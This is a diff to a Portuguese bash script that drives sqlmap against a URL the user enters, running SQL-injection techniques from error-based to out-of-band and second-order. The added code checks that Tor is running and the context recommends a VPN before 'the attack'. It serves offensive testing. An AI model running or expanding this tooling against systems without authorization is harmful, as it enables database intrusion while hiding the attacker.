@@ -43,6 +43,22 @@ opsec_check() {
     echo "[OPSEC] Recomenda-se uso de VPN antes de iniciar o ataque." | tee -a "$LOG_DIR/opsec.log"
 }
 
+# Função para imprimir mensagens coloridas
+print_color() {
+    local color=$1; shift
+    case $color in
+        red) tput setaf 1;;
+        green) tput setaf 2;;
+        yellow) tput setaf 3;;
+        blue) tput setaf 4;;
+        magenta) tput setaf 5;;
+        cyan) tput setaf 6;;
+        *) tput sgr0;;
+    esac
+    echo "$@"
+    tput sgr0
+}
+
 # Checagens essenciais ANTES de qualquer input
 check_root
 opsec_check
@@ -102,6 +118,25 @@ run_custom_scripts() {
     fi
 }
 
+# Checagem de permissões de escrita
+for dir in "$RESULT_DIR" "$LOG_DIR" "$RELATORIO_DIR"; do
+    if [ ! -w "$dir" ]; then
+        print_color red "[ERRO] Sem permissão de escrita em $dir. Abortando."
+        exit 1
+    fi
+    done
+
+# Checagem real do serviço Tor
+if command -v systemctl >/dev/null 2>&1; then
+    if systemctl is-active --quiet tor; then
+        print_color green "[OPSEC] Tor está rodando."
+        echo "[OPSEC] Tor está rodando." | tee -a "$LOG_DIR/opsec.log"
+    else
+        print_color yellow "[OPSEC] Tor NÃO está rodando!"
+        echo "[OPSEC] Tor NÃO está rodando!" | tee -a "$LOG_DIR/opsec.log"
+    fi
+fi
+
 # Entrada do alvo
 read -p "Digite a URL vulnerável para testar SQLi: " TARGET_URL
 TARGET_URL=$(echo "$TARGET_URL" | xargs)
@@ -111,45 +146,66 @@ if [[ -z "$TARGET_URL" ]]; then
 fi
 
 # Menu interativo de técnicas
-echo "Escolha as técnicas de SQLi a serem testadas (separe por espaço):"
-echo "1) Error-Based"
-echo "2) Union-Based"
-echo "3) Boolean-Based"
-echo "4) Time-Based"
-echo "5) OOB"
-echo "6) Second-Order"
-read -p "Digite os números das técnicas (ex: 1 2 3): " TECNICAS
+while true; do
+    echo "Escolha as técnicas de SQLi a serem testadas (separe por espaço):"
+    echo "1) Error-Based"
+    echo "2) Union-Based"
+    echo "3) Boolean-Based"
+    echo "4) Time-Based"
+    echo "5) OOB"
+    echo "6) Second-Order"
+    read -p "Digite os números das técnicas (ex: 1 2 3): " TECNICAS
+    # Validação rígida: só aceita 1-6
+    TECNICAS_VALIDAS=""
+    for t in $TECNICAS; do
+        if [[ "$t" =~ ^[1-6]$ ]] && [[ ! " $TECNICAS_VALIDAS " =~ " $t " ]]; then
+            TECNICAS_VALIDAS+="$t "
+        else
+            print_color yellow "[AVISO] Técnica inválida ou repetida ignorada: $t"
+        fi
+    done
+    if [[ -n "$TECNICAS_VALIDAS" ]]; then
+        break
+    else
+        print_color red "Nenhuma técnica válida selecionada. Tente novamente."
+    fi
+    done
 
-for t in $TECNICAS; do
+declare -A TECNICA_STATUS
+for t in $TECNICAS_VALIDAS; do
     case $t in
         1)
-            run_sqlmap "$TARGET_URL" "error-based" "--technique=E"
+            run_sqlmap "$TARGET_URL" "error-based" "--technique=E" && TECNICA_STATUS[Error-Based]="Executada"
             ;;
         2)
-            run_sqlmap "$TARGET_URL" "union-based" "--technique=U"
+            run_sqlmap "$TARGET_URL" "union-based" "--technique=U" && TECNICA_STATUS[Union-Based]="Executada"
             ;;
         3)
-            run_sqlmap "$TARGET_URL" "boolean-based" "--technique=B"
+            run_sqlmap "$TARGET_URL" "boolean-based" "--technique=B" && TECNICA_STATUS[Boolean-Based]="Executada"
             ;;
         4)
-            run_sqlmap "$TARGET_URL" "time-based" "--technique=T"
+            run_sqlmap "$TARGET_URL" "time-based" "--technique=T" && TECNICA_STATUS[Time-Based]="Executada"
             ;;
         5)
-            run_sqlmap "$TARGET_URL" "oob" "--technique=O"
+            run_sqlmap "$TARGET_URL" "oob" "--technique=O" && TECNICA_STATUS[OOB]="Executada"
             ;;
         6)
             read -p "Digite a URL de segunda ordem (ou deixe vazio): " SECOND_URL
             SECOND_URL=$(echo "$SECOND_URL" | xargs)
             if [ -n "$SECOND_URL" ]; then
-                run_sqlmap "$TARGET_URL" "second-order" "--second-order=$SECOND_URL"
+                run_sqlmap "$TARGET_URL" "second-order" "--second-order=$SECOND_URL" && TECNICA_STATUS[Second-Order]="Executada"
             else
+                print_color yellow "[INFO] Técnica second-order ignorada (sem URL)."
                 echo "[INFO] Técnica second-order ignorada (sem URL)." | tee -a "$RELATORIO_FILE"
             fi
             ;;
-        *)
-            echo "[WARN] Técnica desconhecida: $t" | tee -a "$RELATORIO_FILE"
-            ;;
     esac
+done
+
+# Resumo final no relatório
+echo "\nResumo das técnicas executadas:" | tee -a "$RELATORIO_FILE"
+for k in "${!TECNICA_STATUS[@]}"; do
+    echo "- $k: ${TECNICA_STATUS[$k]}" | tee -a "$RELATORIO_FILE"
 done
 
 # Rodar scripts customizados do repositório
